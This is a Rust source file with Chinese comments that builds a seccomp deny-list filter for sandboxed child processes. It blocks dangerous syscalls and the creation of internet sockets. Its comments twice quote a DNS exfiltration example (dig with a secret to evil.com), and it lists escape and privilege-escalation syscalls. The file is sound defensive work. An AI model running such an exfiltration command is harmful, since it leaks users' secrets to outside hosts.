//! seccomp 危险系统调用拒绝过滤器（A1，feature gate `seccomp`，仅 Linux）。
//!
//! ## 策略：deny-list 而非 allow-list
//!
//! 默认动作 `Allow`，仅对已知危险 syscall 返回 `EPERM`。不用 allow-list
//! （默认 `Errno` + 逐个放行）的原因是**可用性**：allow-list 需要枚举子进程
//! 可能执行的全部合法 syscall（glibc/musl/编译器/rustc 各版本组合差异巨大），
//! 漏一项即导致正常命令随机失败；deny-list 对未知 syscall 保持放行，不破坏
//! 正常命令，只封堵明确的内核攻击面（容器逃逸/权限提升原语）。这是
//! Chromium/Docker default profile 同款的工程取舍。
//!
//! ## UDP/DNS 边界
//!
//! landlock ABI4 网络原语仅覆盖 TCP（bind/connect），UDP/DNS/ICMP 残留外泄
//! 通道（如 `dig $(cat secret).evil.com`）由本过滤器的**参数化规则**封堵：
//! `socket(AF_INET)`/`socket(AF_INET6)` 拒绝（SEC-8，2026-08-28 R5 收尾）。
//! `AF_UNIX` 不受影响（沙箱内本地 IPC 是合法需求）。web 工具在主进程内执行
//! 不经 seccomp（沙箱只作用于 spawn 的子进程），其 DNS 解析-连接 IP pinning
//! （A2，`minicoding-tools::web`）在应用层另行处理。
//! ## 与 pre_exec 的协作方式
//!
//! libseccomp 的 filter 构建（`new`/`add_arch`/`add_rule`）与加载（`load`）
//! 都会堆分配，严格说不是 async-signal-safe。采用 Chromium 同款实践：
//! **父进程侧**预先完成全部构建工作（[`prepare_deny_filter`]），pre_exec 闭包内
//! 仅调用 [`load_prepared`]（一次 `seccomp_load`），把 fork 后 exec 前窗口内的
//! 工作量压到最小。残余风险（父线程可能持有 malloc 锁）已知且接受——业界同款，
//! 见 `linux.rs` apply 处的 SAFETY 注释。
//!
//! syscall 名经 `ScmpSyscall::from_name` 解析，解析失败（旧内核无该 syscall）
//! 该条跳过并记 debug 日志——deny-list 天然向前兼容新内核。

use minicoding_core::sandbox::SandboxError;

/// deny-list：拒绝（返回 `EPERM`）的危险 syscall。
///
/// 覆盖内核攻击面四类：
/// - 进程注入/调试：`ptrace`；
/// - 内核镜像/模块：`kexec_load`/`kexec_file_load`/`init_module`/`finit_module`
///   /`delete_module`；
/// - 内核接口滥用：`open_by_handle_at`（shocker 提权）/`bpf`/`perf_event_open`
///   /`userfaultfd`；
/// - 跨进程内存读取：`process_vm_readv`/`process_vm_writev`；
/// - 密钥环/持久化：`keyctl`/`add_key`/`request_key`/`swapon`/`swapoff`
///   /`reboot`；
/// - 命名空间切换（逃逸沙箱命名空间）：`setns`/`unshare`；
/// - 现代内核攻击面（R8 SEC-9 补）：`io_uring_setup`/`io_uring_enter`/
///   `io_uring_register`（`io_uring` 内核漏洞面，绕过普通 fd 审计）。
///
/// **`clone3` 明确不纳入 deny-list**：glibc ≥2.34 默认经 `clone3` 创建线程
/// （`pthread_create`），全量拒绝会让一切多线程命令随机失败（EPERM 不触发
/// glibc 的 ENOSYS 回退）——与 deny-list"不破坏正常命令"的工程取舍冲突
/// （Docker default profile 同款只做参数过滤，实现复杂且收益有限，未采用）。
const DENIED_SYSCALLS: &[&str] = &[
    "ptrace",
    "kexec_load",
    "kexec_file_load",
    "init_module",
    "finit_module",
    "delete_module",
    "open_by_handle_at",
    "bpf",
    "perf_event_open",
    "userfaultfd",
    "process_vm_readv",
    "process_vm_writev",
    "keyctl",
    "add_key",
    "request_key",
    "swapon",
    "swapoff",
    "reboot",
    "setns",
    "unshare",
    "io_uring_setup",
    "io_uring_enter",
    "io_uring_register",
];

/// 构建完毕、待在子进程内加载的 seccomp 过滤器。
///
/// [`libseccomp::ScmpFilterContext`] 内含 libseccomp 裸句柄，库未实现
/// `Send`/`Sync`；`pre_exec` 闭包要求捕获类型满足二者。本包装的安全性依据：
///
/// - **无并发访问**：句柄只在两个串行场景被触碰——父进程 spawn 前的单线程
///   构建（此后不再修改），以及子进程 fork 后 exec 前窗口内的一次
///   `load()`（fork 后子进程为单线程上下文）；
/// - **所有权唯一**：包装值经 `Option::take` 移动进闭包，同一时刻至多一个
///   所有者可解引用句柄；
/// - 与 landlock `RulesetCreated` 捕获进同一闭包的既有用法语义一致。
///
/// （`Sync` 侧：不存在"共享引用跨线程"的实际用法——`&Self.load()` 仅发生在
/// 子进程单线程窗口；标记 `Sync` 只为满足 `pre_exec` 的 bound。）
pub(crate) struct PreparedFilter(libseccomp::ScmpFilterContext);

// SAFETY: 见类型文档——句柄所有者唯一、访问严格串行（父进程构建 / 子进程
// 单线程加载），不存在并发读写该 C 侧状态的执行路径。
unsafe impl Send for PreparedFilter {}
// SAFETY: 同上；`Sync` 仅为满足 `CommandExt::pre_exec` 对闭包捕获类型的
// `Send + Sync` 要求，实际不存在多线程共享调用点。
unsafe impl Sync for PreparedFilter {}

/// 构建危险 syscall 拒绝过滤器（默认 Allow + 逐条 `Errno(EPERM)` 规则）。
///
/// 全部构建工作（`add_arch`/`add_rule`）在父进程完成；解析失败的 syscall
/// （内核版本差异）跳过并记 debug 日志。成功时以 `tracing::info` 记录生效集。
///
/// # Errors
/// libseccomp 初始化失败（filter 创建/加架构失败，通常意味着系统 libseccomp
/// 与内核 ABI 不兼容）时返回 `SandboxError`。
pub(crate) fn prepare_deny_filter() -> Result<PreparedFilter, SandboxError> {
    use libseccomp::{ScmpAction, ScmpArch, ScmpFilterContext, ScmpSyscall};

    let mut ctx = ScmpFilterContext::new(ScmpAction::Allow)
        .map_err(|e| SandboxError::Sandbox(format!("seccomp filter 创建失败: {e}")))?;
    // SEC-8（2026-08-26 R3 审查）：多架构覆盖——此前仅 Native arch，x86_64 上
    // 32-bit 兼容 syscall（`int 0x80`，i386 syscall 号体系）不在过滤器内，
    // 默认 action=Allow 使 deny-list 全部旁路（Docker default profile 同款
    // 处理是显式 add_arch(x86)+add_arch(x32)）。add_arch 失败（如内核未启用
    // IA32 emulation）按 warn 跳过而非 fail-closed：该平台上兼容 syscall
    // 本就不可达。
    ctx.add_arch(ScmpArch::Native)
        .map_err(|e| SandboxError::Sandbox(format!("seccomp add_arch 失败: {e}")))?;
    #[cfg(target_arch = "x86_64")]
    {
        for arch in [ScmpArch::X86, ScmpArch::X32] {
            if let Err(e) = ctx.add_arch(arch) {
                tracing::warn!(
                    error = %e,
                    "seccomp: 32-bit 兼容架构添加失败（内核可能未启用 IA32 emulation），跳过"
                );
            }
        }
    }

    let mut applied: Vec<&str> = Vec::with_capacity(DENIED_SYSCALLS.len());
    for name in DENIED_SYSCALLS {
        match ScmpSyscall::from_name(name) {
            Ok(syscall) => {
                // EPERM（而非 KillProcess）：让子进程收到可诊断的失败而非信号，
                // denial 检测层可据 errno 归因（C-30 结构化信号）
                ctx.add_rule(ScmpAction::Errno(libc::EPERM), syscall)
                    .map_err(|e| SandboxError::Sandbox(format!("seccomp add_rule {name}: {e}")))?;
                applied.push(name);
            }
            Err(_) => {
                // 旧内核无该 syscall：跳过（deny-list 向前兼容，不影响其余规则）
                tracing::debug!(syscall = name, "seccomp: 当前内核不支持该 syscall，跳过");
            }
        }
    }

    // SEC-8（2026-08-28 R5 收尾）：UDP/DNS 外泄通道封堵——landlock ABI4 网络
    // 原语仅覆盖 TCP，沙箱子进程仍可用 `dig $(cat secret).evil.com` 或任意
    // UDP 报文对外通信（security.md 曾误称"默认禁 TCP/UDP"）。此处用 seccomp
    // **参数过滤**封堵 socket 创建：仅拒绝 `socket(AF_INET/AF_INET6, ...)`，
    // 不误伤 AF_UNIX（本地 IPC 是沙箱内合法需求，SSH/容器 agent 依赖）。规则
    // 追加在 `socket` 的 deny 之后（libseccomp 多规则同 syscall 取并集），
    // AF_INET=2、AF_INET6=10。默认 action=Allow，未匹配的 socket 域仍放行
    // （如 AF_UNIX）。
    if let Ok(socket_syscall) = ScmpSyscall::from_name("socket") {
        use libseccomp::{ScmpArgCompare, ScmpCompareOp};
        for af in [2u64, 10u64] {
            ctx.add_rule_conditional(
                ScmpAction::Errno(libc::EPERM),
                socket_syscall,
                &[ScmpArgCompare::new(0, ScmpCompareOp::Equal, af)],
            )
            .map_err(|e| {
                SandboxError::Sandbox(format!("seccomp add_rule socket(AF_INET{af}): {e}"))
            })?;
        }
        applied.push("socket(AF_INET/AF_INET6)");
    } else {
        tracing::debug!("seccomp: 当前内核不支持 socket syscall，跳过");
    }
    tracing::info!(
        applied = applied.len(),
        total = DENIED_SYSCALLS.len(),
        syscalls = ?applied,
        "seccomp deny-list 过滤器已构建（子进程 spawn 时加载）"
    );
    Ok(PreparedFilter(ctx))
}

/// 在**子进程**内（`pre_exec` 闭包中）加载已构建好的过滤器。
///
/// # Errors
/// `seccomp_load` 失败时返回 `io::Error`（调用方使 exec 失败，fail-closed）。
pub(crate) fn load_prepared(filter: &PreparedFilter) -> Result<(), std::io::Error> {
    filter
        .0
        .load()
        .map_err(|e| std::io::Error::other(format!("seccomp load failed: {e}")))
}

#[cfg(test)]
mod tests {
    #![allow(clippy::pedantic)]
    use super::*;

    #[test]
    fn prepare_deny_filter_succeeds_on_native() {
        // 本机装有 libseccomp 时应能完整构建（仅构建不加载，不约束当前进程）
        let ctx = prepare_deny_filter().expect("seccomp filter 构建");
        // 未加载的过滤器对当前进程无约束；再次 drop 即可
        drop(ctx);
    }

    #[test]
    fn denied_list_covers_core_kernel_attack_surfaces() {
        // 关键项防回退：列表被误删时在此暴露（R8 SEC-9 补 io_uring 族）
        for required in [
            "ptrace",
            "bpf",
            "unshare",
            "setns",
            "open_by_handle_at",
            "io_uring_setup",
            "io_uring_enter",
        ] {
            assert!(
                DENIED_SYSCALLS.contains(&required),
                "deny-list 缺少关键 syscall `{required}`"
            );
        }
    }
}
